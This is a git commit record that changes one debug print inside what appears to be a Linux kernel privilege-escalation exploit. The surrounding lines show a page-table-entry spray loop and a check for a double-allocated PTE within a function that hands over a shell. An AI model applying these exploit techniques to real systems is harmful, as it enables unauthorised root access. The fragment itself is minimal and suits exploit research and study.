a4004afd3b1bd9d9a2c7043fdff0d3cb3ee7b287
Willenst <willenst@gmail.com>
2024-11-22 13:36:32 +0200

    create some overload

--- src/main.c
+++ src/main.c
@@ -357,7 +357,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
 	{
 		unsigned long long *test_target_addr = PTI_TO_VIRT(2, 0, i, 0, 0);
-		printf("%d",i);
+		printf("%d",i*i*i*i*i);
 		// pte entry pte[0] should be the PFN+flags for &_pmd_area
 		// if this is the double allocated PTE, the value is PFN+flags, not 0x41
 		if (*test_target_addr != 0x41)
